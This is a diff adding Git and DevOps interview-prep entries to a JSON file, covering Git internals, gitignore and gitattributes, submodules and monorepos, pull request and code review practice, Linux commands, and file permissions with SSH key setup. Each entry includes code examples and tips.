+          "code": "# See all objects in the repository\ngit count-objects -v\n# count: 150        (loose objects)\n# size: 600         (KB of loose objects)\n# in-pack: 3200     (objects in pack files)\n# packs: 1          (number of pack files)\n# size-pack: 1200   (KB of pack files)\n\n# Verify repository integrity\ngit fsck\n# Checking object directories: 100% done.\n# Checking objects: 100% done.\n\n# Manually trigger garbage collection\ngit gc\n# Compresses loose objects into pack files\n# Removes unreachable objects older than 2 weeks\n\n# See what a reference resolves to\ngit rev-parse HEAD\n# a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n\ngit rev-parse HEAD~3\n# m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9\n\n# Find objects by partial hash\ngit rev-parse --short HEAD\n# a1b2c3d\n\n# Show object size\ngit cat-file -s HEAD\n# 264",
+          "explanation": "Git's garbage collector packs loose objects and removes unreachable ones. git fsck verifies integrity. Understanding storage helps debug repository issues."
+        }
+      ],
+      "notes": [
+        "Git is a content-addressable filesystem - identical content always produces the same hash",
+        "Branches are just pointers (40-byte files) which is why branching is instant in Git",
+        "Pack files use delta compression to efficiently store similar objects"
+      ],
+      "followUps": [
+        "What happens when two different contents produce the same SHA-1 hash (collision)?",
+        "How does Git's delta compression work in pack files?",
+        "What is the difference between a loose object and a packed object?"
+      ],
+      "interviewTips": [
+        "Understanding internals separates senior from junior candidates",
+        "Be able to explain why Git branching is fast by referencing the object model",
+        "Know git cat-file and git rev-parse for debugging repository issues"
+      ]
+    }
+  },
+  {
+    "id": "git-gitignore",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 14,
+    "title": "Gitignore & Git Attributes",
+    "difficulty": "Beginner",
+    "type": "Theory",
+    "concepts": [".gitignore", ".gitattributes", "Ignoring Files", "Line Endings", "LFS"],
+    "content": {
+      "question": "How does .gitignore work? What is .gitattributes and when would you use it?",
+      "answer": ".gitignore tells Git which files and directories to ignore. Patterns in this file prevent untracked files from being added to the repository. It uses glob patterns: * matches anything, ** matches directories recursively, ! negates a pattern, and / anchors to the directory containing the .gitignore.\n\nImportant: .gitignore only affects untracked files. If a file is already tracked by Git, adding it to .gitignore will not stop Git from tracking it. You must first remove it from tracking with git rm --cached.\n\n.gitattributes controls how Git handles files. It defines per-path attributes like line ending normalization (text=auto), diff and merge strategies for specific file types, and Git LFS (Large File Storage) tracking for binary files. It ensures consistent behavior across different operating systems and editors.\n\nCommon .gitattributes uses: ensuring LF line endings on all platforms, marking binary files so Git does not try to diff them, and configuring Git LFS for large assets like images and videos.",
+      "codeExamples": [
+        {
+          "title": ".gitignore Patterns",
+          "code": "# .gitignore for a Node.js project\n\n# Dependencies\nnode_modules/\n\n# Build output\ndist/\nbuild/\n*.js.map\n\n# Environment files (NEVER commit secrets)\n.env\n.env.local\n.env.*.local\n\n# OS files\n.DS_Store\nThumbs.db\n\n# IDE files\n.vscode/\n.idea/\n*.swp\n*.swo\n\n# Logs\n*.log\nlogs/\n\n# Coverage\ncoverage/\n\n# Pattern examples:\n# *        matches anything except /\n# **       matches directories recursively\n# ?        matches any single character\n# [abc]    matches a, b, or c\n# !        negates (un-ignore)\n\n# Ignore all .log files except error.log\n*.log\n!error.log\n\n# Ignore build/ in root only (not subdir/build/)\n/build/\n\n# Ignore all files in temp directories\n**/temp/**",
+          "explanation": "Start with a template from github.com/github/gitignore for your language. Always ignore node_modules, .env, and build output. The ! operator lets you whitelist specific files."
+        },
+        {
+          "title": "Removing Already-Tracked Files",
+          "code": "# Problem: you committed .env before adding it to .gitignore\n# .gitignore does NOT stop tracking already-tracked files\n\n# Solution: remove from Git but keep the file locally\ngit rm --cached .env\ngit commit -m \"chore: stop tracking .env file\"\n\n# Remove a directory from tracking\ngit rm -r --cached node_modules/\ngit commit -m \"chore: remove tracked node_modules\"\n\n# Remove all files that should be ignored\n# (based on current .gitignore)\ngit rm -r --cached .\ngit add .\ngit commit -m \"chore: apply gitignore to all tracked files\"\n\n# Check what Git is ignoring\ngit status --ignored\n\n# Check why a file is ignored\ngit check-ignore -v path/to/file\n# .gitignore:3:*.log    path/to/file\n# Shows which rule and which .gitignore file matched\n\n# Global gitignore (for personal OS/IDE files)\ngit config --global core.excludesFile ~/.gitignore_global",
+          "explanation": "git rm --cached removes from tracking without deleting the file. Use a global gitignore for OS-specific files so project .gitignore stays clean."
+        },
+        {
+          "title": ".gitattributes Configuration",
+          "code": "# .gitattributes - normalize line endings\n* text=auto\n*.js text eol=lf\n*.ts text eol=lf\n*.json text eol=lf\n*.md text eol=lf\n*.sh text eol=lf\n\n# Mark binary files (don't diff or merge)\n*.png binary\n*.jpg binary\n*.pdf binary\n*.woff2 binary\n\n# Git LFS for large files\n*.psd filter=lfs diff=lfs merge=lfs -text\n*.zip filter=lfs diff=lfs merge=lfs -text\n*.mp4 filter=lfs diff=lfs merge=lfs -text\n\n# Custom diff for certain files\n*.lock linguist-generated=true\n*.min.js linguist-vendored=true\n\n# Setup Git LFS\ngit lfs install\ngit lfs track \"*.psd\"\ngit lfs track \"*.mp4\"\n# This updates .gitattributes automatically\n\n# Check LFS tracked files\ngit lfs ls-files",
+          "explanation": "text=auto normalizes line endings across platforms. binary prevents meaningless diffs on images. Git LFS stores large files efficiently on a separate server."
+        }
+      ],
+      "notes": [
+        ".gitignore only affects untracked files - use git rm --cached for already-tracked files",
+        "Use a global gitignore for OS-specific files like .DS_Store and Thumbs.db",
+        ".gitattributes with text=auto prevents line ending issues across Windows/Mac/Linux"
+      ],
+      "followUps": [
+        "What happens if you commit a secret to Git and then add it to .gitignore?",
+        "How does Git LFS work and when should you use it?",
+        "Can you have .gitignore files in subdirectories?"
+      ],
+      "interviewTips": [
+        "Mention that .gitignore does not retroactively ignore tracked files - a common mistake",
+        "Know how to handle accidentally committed secrets (git rm --cached, rotate the secret)",
+        "Understanding .gitattributes for line endings shows cross-platform awareness"
+      ]
+    }
+  },
+  {
+    "id": "git-submodules",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 15,
+    "title": "Git Submodules & Monorepos",
+    "difficulty": "Advanced",
+    "type": "Concept",
+    "concepts": ["Git Submodules", "Monorepos", "git subtree", "Turborepo", "Nx", "Lerna"],
+    "content": {
+      "question": "What are Git submodules? How do monorepos work, and what tools exist for managing them?",
+      "answer": "Git submodules allow you to embed one Git repository inside another as a subdirectory. The parent repo stores a reference to a specific commit in the submodule, not the actual files. This is useful for shared libraries, vendor code, or when different parts of a project have independent release cycles.\n\nSubmodule challenges: they add complexity to cloning, pulling, and switching branches. Developers must remember to initialize and update submodules. Commits in the parent only record which submodule commit to use, leading to frequent out-of-sync issues.\n\nMonorepos take the opposite approach: put everything in one repository. Companies like Google, Facebook, and Microsoft use monorepos for massive codebases. Benefits include atomic cross-project changes, unified CI/CD, shared tooling, and simplified dependency management.\n\nMonorepo tools:\n- Turborepo: Fast, uses caching and parallelism. Great for JS/TS projects.\n- Nx: Full-featured with dependency graph analysis and affected-only testing.\n- Lerna: Pioneered JS monorepos. Good for publishing multiple npm packages.\n- git subtree: Git-native alternative to submodules. Merges external repo history into a subdirectory.",
+      "codeExamples": [
+        {
+          "title": "Git Submodule Operations",
+          "code": "# Add a submodule\ngit submodule add https://github.com/lib/shared-utils.git libs/shared\n# Creates .gitmodules file and libs/shared/ directory\n\n# Clone a repo with submodules\ngit clone --recurse-submodules https://github.com/user/project.git\n# Or after cloning:\ngit submodule init\ngit submodule update\n\n# Update submodule to latest remote commit\ncd libs/shared\ngit checkout main\ngit pull\ncd ../..\ngit add libs/shared\ngit commit -m \"chore: update shared-utils submodule\"\n\n# Update all submodules at once\ngit submodule update --remote --merge\n\n# See submodule status\ngit submodule status\n# +a1b2c3d libs/shared (v1.2.0)\n# + means the submodule has a different commit than recorded\n\n# Remove a submodule\ngit submodule deinit libs/shared\ngit rm libs/shared\nrm -rf .git/modules/libs/shared\ngit commit -m \"chore: remove shared-utils submodule\"",
+          "explanation": "Submodules are references to specific commits in external repos. The parent tracks which commit to use. Always clone with --recurse-submodules to get submodule contents."
+        },
+        {
+          "title": "Git Subtree Alternative",
+          "code": "# Add a subtree (merges external repo into a directory)\ngit subtree add --prefix=libs/shared \\\n  https://github.com/lib/shared-utils.git main --squash\n\n# Pull updates from the external repo\ngit subtree pull --prefix=libs/shared \\\n  https://github.com/lib/shared-utils.git main --squash\n\n# Push changes back to the external repo\ngit subtree push --prefix=libs/shared \\\n  https://github.com/lib/shared-utils.git main\n\n# Advantages over submodules:\n# - No special clone commands needed\n# - History is merged into the parent repo\n# - Simpler workflow for contributors\n# - No .gitmodules file to manage\n\n# Disadvantages:\n# - Larger repo size (history is duplicated)\n# - Pushing changes back is more complex\n# - Less clear boundary between repos",
+          "explanation": "Subtrees are simpler than submodules for most use cases. The external code lives directly in your repo with no special initialization needed. Choose subtrees for simplicity, submodules for strict version pinning."
+        },
+        {
+          "title": "Monorepo with Turborepo",
+          "code": "# Initialize a Turborepo monorepo\nnpx create-turbo@latest my-monorepo\n\n# Directory structure:\n# my-monorepo/\n# +-- apps/\n# |   +-- web/         (Next.js frontend)\n# |   +-- api/         (Express backend)\n# +-- packages/\n# |   +-- ui/          (shared component library)\n# |   +-- config/      (shared ESLint/TS config)\n# |   +-- utils/       (shared utilities)\n# +-- turbo.json\n# +-- package.json\n\n# turbo.json - define task dependencies\n{\n  \"pipeline\": {\n    \"build\": {\n      \"dependsOn\": [\"^build\"],\n      \"outputs\": [\"dist/**\", \".next/**\"]\n    },\n    \"test\": {\n      \"dependsOn\": [\"build\"]\n    },\n    \"lint\": {},\n    \"dev\": {\n      \"cache\": false\n    }\n  }\n}\n\n# Run tasks across all packages\nnpx turbo build    # builds all packages in dependency order\nnpx turbo test     # runs tests with caching\nnpx turbo lint     # lints all packages in parallel\n\n# Run only affected packages\nnpx turbo build --filter=web...\n# Only builds web and its dependencies",
+          "explanation": "Turborepo analyzes the dependency graph and runs tasks in optimal order. Caching means unchanged packages are not rebuilt. --filter runs tasks only for affected packages."
+        }
+      ],
+      "notes": [
+        "Submodules pin to a specific commit, not a branch - you must explicitly update them",
+        "Subtrees are simpler than submodules but duplicate history in the parent repo",
+        "Monorepo tools like Turborepo use caching and dependency graphs to keep builds fast"
+      ],
+      "followUps": [
+        "When would you choose submodules over subtrees?",
+        "What are the challenges of monorepos at scale?",
+        "How do you handle CI/CD in a monorepo to avoid rebuilding everything?"
+      ],
+      "interviewTips": [
+        "Know the trade-offs between submodules, subtrees, and monorepos",
+        "Mention real-world monorepo tools like Turborepo or Nx to show current knowledge",
+        "Explain that monorepos enable atomic cross-project changes which polyrepos cannot"
+      ]
+    }
+  },
+  {
+    "id": "git-pr-practices",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 16,
+    "title": "Pull Request Best Practices",
+    "difficulty": "Beginner",
+    "type": "Theory",
+    "concepts": ["Pull Requests", "Code Review", "PR Templates", "Branch Protection", "CODEOWNERS"],
+    "content": {
+      "question": "What makes a good pull request? Describe your ideal PR workflow and review process.",
+      "answer": "A good pull request is small, focused, well-described, and easy to review. The ideal PR changes fewer than 400 lines, addresses a single concern, and includes a clear description of what changed and why.\n\nPR anatomy:\n- Title: Concise summary following commit conventions (feat:, fix:, etc.)\n- Description: What changed, why, how to test, screenshots for UI changes\n- Size: Small and focused. Large PRs get rubber-stamped, small PRs get thorough reviews.\n- Tests: Include or update tests that cover the changes\n- Self-review: Review your own diff before requesting others\n\nBranch protection rules enforce quality:\n- Require PR reviews before merging (minimum 1-2 approvals)\n- Require status checks to pass (CI/CD pipeline)\n- Require up-to-date branches before merging\n- Restrict who can push to protected branches\n\nCODEOWNERS file automatically assigns reviewers based on file paths, ensuring domain experts review relevant changes. PR templates standardize descriptions so reviewers always get the context they need.",
+      "codeExamples": [
+        {
+          "title": "PR Template and CODEOWNERS",
+          "code": "# .github/PULL_REQUEST_TEMPLATE.md\n## What\n<!-- Brief description of changes -->\n\n## Why\n<!-- Motivation / link to issue -->\nCloses #___\n\n## How\n<!-- Implementation approach -->\n\n## Testing\n- [ ] Unit tests added/updated\n- [ ] Manual testing completed\n- [ ] No regressions found\n\n## Screenshots\n<!-- For UI changes, add before/after screenshots -->\n\n---\n\n# .github/CODEOWNERS\n# Automatically request reviews from domain experts\n*.ts                @backend-team\n*.tsx               @frontend-team\nsrc/auth/           @security-team\nsrc/payments/       @payments-team\n.github/workflows/  @devops-team\nprisma/             @backend-team @dba-team\nDockerfile          @devops-team",
+          "explanation": "PR templates ensure consistent descriptions. CODEOWNERS auto-assigns reviewers by file path. This scales code review as the team grows."
+        },
+        {
+          "title": "Branch Protection Configuration",
+          "code": "# GitHub branch protection rules (via gh CLI)\ngh api repos/{owner}/{repo}/branches/main/protection -X PUT \\\n  --input - <<EOF\n{\n  \"required_status_checks\": {\n    \"strict\": true,\n    \"contexts\": [\"ci/test\", \"ci/lint\", \"ci/build\"]\n  },\n  \"required_pull_request_reviews\": {\n    \"required_approving_review_count\": 2,\n    \"dismiss_stale_reviews\": true,\n    \"require_code_owner_reviews\": true\n  },\n  \"enforce_admins\": true,\n  \"restrictions\": null\n}\nEOF\n\n# What these rules enforce:\n# 1. CI checks must pass before merge\n# 2. Branch must be up-to-date with main\n# 3. 2 approving reviews required\n# 4. Stale reviews dismissed on new pushes\n# 5. CODEOWNERS must approve their files\n# 6. Even admins follow the rules",
+          "explanation": "Branch protection prevents direct pushes to main and ensures quality gates. dismiss_stale_reviews means new pushes reset previous approvals, requiring fresh review."
+        },
+        {
+          "title": "PR Workflow Commands",
+          "code": "# Create a PR from command line\ngh pr create --title \"feat: add user authentication\" \\\n  --body \"## What\\nAdded login and registration endpoints\" \\\n  --reviewer \"teammate1,teammate2\" \\\n  --assignee \"@me\" \\\n  --label \"feature\"\n\n# List open PRs\ngh pr list\n\n# Review a PR\ngh pr diff 42\ngh pr review 42 --approve\ngh pr review 42 --request-changes --body \"Please add tests\"\n\n# Merge strategies:\n# 1. Merge commit: preserves all commits + merge commit\ngh pr merge 42 --merge\n# 2. Squash merge: all commits become one (clean history)\ngh pr merge 42 --squash\n# 3. Rebase merge: replays commits on main (linear, no merge commit)\ngh pr merge 42 --rebase\n\n# Check PR status\ngh pr checks 42\ngh pr status\n\n# Auto-merge when checks pass\ngh pr merge 42 --auto --squash",
+          "explanation": "gh CLI streamlines PR workflows. Squash merge is recommended for feature PRs to keep main history clean. Auto-merge saves time waiting for CI."
+        }
+      ],
+      "notes": [
+        "PRs under 400 lines get reviewed 3x faster and with higher quality than large PRs",
+        "Squash merge keeps main history clean - one commit per feature/fix",
+        "CODEOWNERS ensures domain experts always review changes in their area"
+      ],
+      "followUps": [
+        "What is the difference between merge, squash merge, and rebase merge?",
+        "How do you handle disagreements during code review?",
+        "What is the ideal PR size and why?"
+      ],
+      "interviewTips": [
+        "Emphasize small, focused PRs - it shows you value reviewability",
+        "Mention PR templates and CODEOWNERS to show you think about team process",
+        "Know the three merge strategies and when to use each"
+      ]
+    }
+  },
+  {
+    "id": "devops-code-review",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 17,
+    "title": "Code Review Process",
+    "difficulty": "Intermediate",
+    "type": "Experience",
+    "concepts": ["Code Review", "Review Checklist", "Feedback Etiquette", "Review Tools", "Pair Programming"],
+    "content": {
+      "question": "How do you approach code review? What do you look for, and how do you give constructive feedback?",
+      "answer": "Code review serves multiple purposes: catching bugs, ensuring code quality, sharing knowledge, and maintaining consistency. A good reviewer balances thoroughness with speed.\n\nWhat to look for:\n1. Correctness: Does the code do what it claims? Are edge cases handled?\n2. Design: Is the approach sound? Are there simpler alternatives?\n3. Readability: Can someone new to the codebase understand this?\n4. Tests: Are there adequate tests? Do they test the right things?\n5. Security: SQL injection, XSS, secrets in code, authentication bypasses?\n6. Performance: N+1 queries, unnecessary re-renders, missing indexes?\n\nFeedback etiquette:\n- Ask questions instead of making demands: 'What do you think about...' vs 'Change this.'\n- Distinguish between blockers and nitpicks (prefix with 'nit:').\n- Praise good code, not just criticize problems.\n- Suggest alternatives, do not just point out issues.\n- Be timely: review within 24 hours to avoid blocking teammates.\n\nCode review is a conversation, not a gate. The goal is to make the code better together while building team knowledge.",
+      "codeExamples": [
+        {
+          "title": "Code Review Checklist",
+          "code": "## Code Review Checklist\n\n### Correctness\n# - [ ] Logic handles edge cases (null, empty, boundary values)\n# - [ ] Error handling is present and appropriate\n# - [ ] No off-by-one errors in loops or array access\n# - [ ] Async operations handle failures and timeouts\n\n### Security\n# - [ ] No secrets hardcoded (API keys, passwords)\n# - [ ] User input is validated and sanitized\n# - [ ] SQL queries use parameterized statements\n# - [ ] Authentication/authorization checked on all endpoints\n# - [ ] No sensitive data in logs or error messages\n\n### Performance\n# - [ ] No N+1 query problems\n# - [ ] Database queries use appropriate indexes\n# - [ ] No unnecessary API calls or re-renders\n# - [ ] Large lists are paginated\n\n### Maintainability\n# - [ ] Functions are focused (single responsibility)\n# - [ ] Variable/function names are descriptive\n# - [ ] No duplicated logic (DRY)\n# - [ ] Complex logic has comments explaining WHY\n\n### Tests\n# - [ ] New code has test coverage\n# - [ ] Edge cases are tested\n# - [ ] Tests are readable and maintainable",
+          "explanation": "Use a checklist to ensure consistent reviews. Not every item applies to every PR, but having the list prevents overlooking important aspects."
+        },
+        {
+          "title": "Review Feedback Examples",
+          "code": "# BAD feedback (vague, demanding, unhelpful):\n# \"This is wrong.\"\n# \"Rewrite this.\"\n# \"Why would you do it this way?\"\n\n# GOOD feedback (specific, constructive, educational):\n\n# Blocker:\n# \"Bug: This will throw if `user` is null (line 45).\n#  We should add a null check:\n#  `if (!user) return res.status(404).json({ error: 'Not found' });`\"\n\n# Suggestion:\n# \"nit: Consider using `Array.find()` instead of `filter()[0]`\n#  for better readability and early exit:\n#  `const admin = users.find(u => u.role === 'admin');`\"\n\n# Question (learning opportunity):\n# \"I'm curious about the choice to use `any` here.\n#  Would a generic type work? Something like:\n#  `function process<T extends User>(data: T): T`\n#  This would give us type safety while staying flexible.\"\n\n# Praise:\n# \"Nice use of the builder pattern here! This makes\n#  the query construction much more readable.\"\n\n# Security concern:\n# \"Security: `req.body.id` is used directly in the SQL query.\n#  This is vulnerable to SQL injection. Please use\n#  parameterized queries: `WHERE id = $1, [req.body.id]`\"",
+          "explanation": "Good review feedback is specific, explains why, and offers alternatives. Prefix nitpicks with 'nit:' so the author knows it is not a blocker."
+        },
+        {
+          "title": "Review Workflow with gh CLI",
+          "code": "# View PR details\ngh pr view 42\ngh pr diff 42\n\n# Start a review (batch comments)\ngh pr review 42 --comment --body \"Overall looks good, a few suggestions:\"\n\n# Add line-specific comments via GitHub UI:\n# 1. Click on the changed file\n# 2. Click the + icon on the line number\n# 3. Type your comment\n# 4. Choose: 'Add single comment' or 'Start a review'\n#    (Start a review batches comments into one notification)\n\n# Approve the PR\ngh pr review 42 --approve --body \"LGTM! Great test coverage.\"\n\n# Request changes\ngh pr review 42 --request-changes --body \\\n  \"Please address the security concern on line 45.\"\n\n# Check CI status before approving\ngh pr checks 42\n# ci/test     pass   2m30s\n# ci/lint     pass   45s\n# ci/build    pass   1m15s\n\n# Resolve a conversation thread\n# (Done via GitHub UI after the author addresses feedback)",
+          "explanation": "Batch comments into a single review to reduce notification noise. Always check CI status. Resolve conversation threads to track what has been addressed."
+        }
+      ],
+      "notes": [
+        "Review within 24 hours to avoid blocking teammates and breaking flow",
+        "Prefix optional suggestions with 'nit:' to distinguish from required changes",
+        "Batch your comments into one review instead of sending individual notifications"
+      ],
+      "followUps": [
+        "How do you handle a situation where you disagree with a reviewer's feedback?",
+        "What is the ideal turnaround time for code reviews?",
+        "How does pair programming relate to code review?"
+      ],
+      "interviewTips": [
+        "Share a specific example of how you gave or received constructive feedback",
+        "Emphasize that code review is about knowledge sharing, not just bug catching",
+        "Mention that you review your own PR first before requesting reviews"
+      ]
+    }
+  },
+  {
+    "id": "devops-linux",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 18,
+    "title": "Linux Command Line Essentials",
+    "difficulty": "Beginner",
+    "type": "Coding",
+    "concepts": ["Linux Commands", "File System", "Processes", "Pipes", "Shell Scripting"],
+    "content": {
+      "question": "What Linux commands should every developer know? Explain file navigation, text processing, and process management.",
+      "answer": "Linux command line proficiency is essential for DevOps and backend development. Servers run Linux, CI/CD pipelines run on Linux, and Docker containers are Linux-based.\n\nFile navigation and management: ls, cd, pwd, mkdir, cp, mv, rm, find, and ln for creating symbolic links.\n\nText processing: cat, head, tail, grep, sed, awk, sort, uniq, wc, and cut. These commands can be piped together using | to create powerful data processing pipelines.\n\nProcess management: ps, top/htop, kill, bg, fg, nohup, and systemctl for managing services.\n\nPipes and redirection: The | operator sends output of one command as input to another. > redirects output to a file (overwrite), >> appends. < reads input from a file. 2>&1 redirects stderr to stdout.\n\nThese commands form the foundation for shell scripting, debugging production issues, and working with Docker containers and CI/CD environments.",
+      "codeExamples": [
+        {
+          "title": "File Navigation and Management",
+          "code": "# Navigation\npwd                          # print working directory\nls -la                       # list all files with details\ncd /var/log                  # change directory\ncd -                         # go to previous directory\ncd ~                         # go to home directory\n\n# File operations\nmkdir -p src/components      # create nested directories\ncp -r src/ backup/           # copy directory recursively\nmv old-name.ts new-name.ts   # rename/move file\nrm -rf dist/                 # remove directory (CAREFUL!)\nln -s /path/to/file link     # create symbolic link\n\n# Finding files\nfind . -name \"*.ts\" -type f         # find TypeScript files\nfind . -name \"*.log\" -mtime +7 -delete  # delete logs older than 7 days\nfind . -size +100M                  # find files larger than 100MB\n\n# Disk usage\ndf -h                        # disk space (human readable)\ndu -sh */                    # size of each subdirectory\ndu -sh node_modules/         # size of node_modules\n\n# File info\nfile image.png               # detect file type\nstat package.json            # detailed file metadata\nwc -l src/**/*.ts            # count lines in TypeScript files",
+          "explanation": "find is incredibly versatile for locating files by name, size, date, or type. du -sh is essential for debugging disk space issues on servers."
+        },
+        {
+          "title": "Text Processing with Pipes",
+          "code": "# View file contents\ncat server.log                  # entire file\nhead -20 server.log             # first 20 lines\ntail -50 server.log             # last 50 lines\ntail -f server.log              # follow log in real-time\n\n# Search with grep\ngrep \"ERROR\" server.log                 # find error lines\ngrep -r \"TODO\" src/                     # recursive search\ngrep -n \"function\" app.ts               # with line numbers\ngrep -c \"404\" access.log                # count matches\ngrep -v \"DEBUG\" server.log              # exclude DEBUG lines\n\n# Pipe chains (powerful combinations)\ncat access.log | grep \"POST\" | wc -l\n# Count POST requests\n\ncat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -10\n# Top 10 IP addresses by request count\n\nps aux | grep node | grep -v grep\n# Find running Node.js processes\n\ndu -sh */ | sort -rh | head -5\n# Top 5 largest directories\n\n# Text transformation\nsed 's/localhost/production.server.com/g' config.txt\n# Replace all occurrences\n\nawk -F',' '{print $1, $3}' data.csv\n# Extract columns 1 and 3 from CSV",
+          "explanation": "Pipes chain commands together: output of one becomes input of the next. grep + sort + uniq + awk can answer most log analysis questions."
+        },
+        {
+          "title": "Process Management",
+          "code": "# View running processes\nps aux                      # all processes\nps aux | grep node          # find Node processes\ntop                         # interactive process viewer\nhtop                        # better interactive viewer\n\n# Kill processes\nkill 12345                  # graceful shutdown (SIGTERM)\nkill -9 12345               # force kill (SIGKILL)\nkillall node                # kill all node processes\npkill -f \"node server.js\"   # kill by command pattern\n\n# Background processes\nnode server.js &            # run in background\njobs                        # list background jobs\nfg %1                       # bring job 1 to foreground\nbg %1                       # resume job 1 in background\nnohup node server.js &      # survives terminal close\n\n# System services (systemd)\nsystemctl status nginx       # check service status\nsystemctl start nginx        # start a service\nsystemctl restart nginx      # restart a service\nsystemctl enable nginx       # start on boot\njournalctl -u nginx -f       # follow service logs\n\n# Port usage\nlsof -i :3000               # what process uses port 3000\nnetstat -tlnp               # all listening ports\nss -tlnp                    # modern alternative to netstat",
+          "explanation": "kill sends SIGTERM by default (graceful). Use kill -9 only as last resort. lsof -i :PORT is essential for debugging 'port already in use' errors."
+        }
+      ],
+      "notes": [
+        "tail -f is your best friend for watching logs in real-time on servers",
+        "Pipe chains with grep, sort, uniq, and awk can answer most log analysis questions",
+        "Use lsof -i :PORT to find what process is using a specific port"
+      ],
+      "followUps": [
+        "What is the difference between SIGTERM and SIGKILL?",
+        "How do you find and kill a process using a specific port?",
+        "What is the difference between > and >> for redirection?"
+      ],
+      "interviewTips": [
+        "Demonstrate comfort with pipes and text processing - it shows real server experience",
+        "Know how to tail logs and grep for errors - this is daily production debugging",
+        "Mention systemctl for service management if you have Linux server experience"
+      ]
+    }
+  },
+  {
+    "id": "devops-permissions-ssh",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 19,
+    "title": "File Permissions & SSH",
+    "difficulty": "Intermediate",
+    "type": "Coding",
+    "concepts": ["File Permissions", "chmod", "chown", "SSH", "SSH Keys", "SSH Config"],
+    "content": {
+      "question": "Explain Linux file permissions. How does SSH work, and how do you set up SSH key-based authentication?",
+      "answer": "Linux file permissions control who can read, write, and execute files. Every file has three permission groups: owner (u), group (g), and others (o). Each group can have read (r=4), write (w=2), and execute (x=1) permissions.\n\nThe numeric notation adds up: 755 means owner has rwx (7), group has r-x (5), others have r-x (5). Common permissions: 644 for files (owner reads/writes, others read), 755 for directories and scripts (owner full, others read/execute), 600 for private keys (owner only).\n\nSSH (Secure Shell) provides encrypted communication between machines. Key-based authentication uses a public/private key pair instead of passwords. The private key stays on your machine (never shared), and the public key goes on the server. When you connect, the server challenges you with the public key, and your client proves identity using the private key.\n\nSSH keys are essential for: Git operations over SSH, connecting to servers, and CI/CD pipeline authentication. Always protect private keys with proper permissions (chmod 600) and optionally a passphrase.",
+      "codeExamples": [
+        {
+          "title": "File Permissions",
+          "code": "# View permissions\nls -la\n# drwxr-xr-x  5 john staff  160 Jan 15 10:00 src/\n# -rw-r--r--  1 john staff  524 Jan 15 10:00 package.json\n# -rwx------  1 john staff  128 Jan 15 10:00 deploy.sh\n\n# Permission breakdown: -rwxr-xr-x\n# -     = file type (- file, d directory, l symlink)\n# rwx   = owner (read, write, execute)\n# r-x   = group (read, execute)\n# r-x   = others (read, execute)\n\n# Numeric: r=4, w=2, x=1\n# rwx = 4+2+1 = 7\n# r-x = 4+0+1 = 5\n# r-- = 4+0+0 = 4\n\n# Change permissions\nchmod 755 deploy.sh            # rwxr-xr-x\nchmod 644 config.json          # rw-r--r--\nchmod 600 ~/.ssh/id_ed25519    # rw------- (private key)\nchmod +x script.sh             # add execute for all\nchmod u+w,g-w file.txt         # add owner write, remove group write\n\n# Change ownership\nchown john:staff file.txt      # change owner and group\nchown -R www-data:www-data /var/www/  # recursive\n\n# Special permissions\nchmod 1777 /tmp                # sticky bit (only owner can delete)\nchmod 4755 /usr/bin/passwd     # setuid (runs as file owner)",
+          "explanation": "Memorize common permissions: 644 (files), 755 (directories/scripts), 600 (private keys). Wrong permissions on SSH keys cause authentication failures."
+        },
+        {
+          "title": "SSH Key Setup",
+          "code": "# Generate an SSH key pair (Ed25519 recommended)\nssh-keygen -t ed25519 -C \"john@example.com\"\n# Enter file: ~/.ssh/id_ed25519\n# Enter passphrase: (optional but recommended)\n# Creates: ~/.ssh/id_ed25519 (private) and ~/.ssh/id_ed25519.pub (public)\n\n# View the public key\ncat ~/.ssh/id_ed25519.pub\n# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... john@example.com\n\n# Copy public key to a server\nssh-copy-id user@server.com\n# Or manually:\ncat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys\n\n# Add key to GitHub\ngh ssh-key add ~/.ssh/id_ed25519.pub --title \"Work Laptop\"\n# Or paste into GitHub Settings > SSH Keys\n\n# Test SSH connection to GitHub\nssh -T git@github.com\n# Hi john! You've successfully authenticated.\n\n# SSH agent (avoid typing passphrase repeatedly)\neval \"$(ssh-agent -s)\"\nssh-add ~/.ssh/id_ed25519\n\n# Fix permission errors\nchmod 700 ~/.ssh\nchmod 600 ~/.ssh/id_ed25519\nchmod 644 ~/.ssh/id_ed25519.pub\nchmod 644 ~/.ssh/authorized_keys",
+          "explanation": "Ed25519 keys are more secure and faster than RSA. The SSH agent caches your passphrase so you only enter it once per session. Correct permissions are mandatory."
+        },
+        {
+          "title": "SSH Config and Remote Access",
+          "code": "# SSH config file (~/.ssh/config)\n# Saves connection details for quick access\n\nHost production\n  HostName 203.0.113.50\n  User deploy\n  Port 22\n  IdentityFile ~/.ssh/id_ed25519\n  ForwardAgent yes\n\nHost staging\n  HostName staging.example.com\n  User deploy\n  IdentityFile ~/.ssh/id_staging\n\nHost github.com\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/id_github\n\n# Now connect with just:\nssh production\n# Instead of: ssh -i ~/.ssh/id_ed25519 deploy@203.0.113.50\n\n# SSH tunneling (port forwarding)\nssh -L 5432:localhost:5432 production\n# Access production DB at localhost:5432\n\n# Copy files with SCP\nscp file.txt production:/home/deploy/\nscp -r ./dist/ production:/var/www/app/\n\n# Rsync (better than scp for syncing)\nrsync -avz --progress ./dist/ production:/var/www/app/\n# -a = archive (preserves permissions)\n# -v = verbose, -z = compress, --progress = show progress",
+          "explanation": "SSH config eliminates remembering IP addresses and key paths. SSH tunneling lets you access remote services securely. Rsync is preferred over SCP for deployments."
+        }
+      ],
+      "notes": [
+        "SSH private keys must have 600 permissions or SSH will refuse to use them",
+        "Ed25519 is the recommended key type - more secure and faster than RSA",
+        "SSH config file saves time and prevents errors when connecting to multiple servers"
+      ],
+      "followUps": [
+        "What is SSH agent forwarding and when is it useful?",
+        "How do you disable password authentication on an SSH server?",
+        "What is the difference between SCP and Rsync?"
+      ],
+      "interviewTips": [
+        "Know SSH key setup from memory - you will do it on every new machine",
+        "Explain why permissions matter: wrong perms on private keys break authentication",
+        "Mention SSH config and tunneling to show production server experience"
+      ]
+    }
+  },
+  {
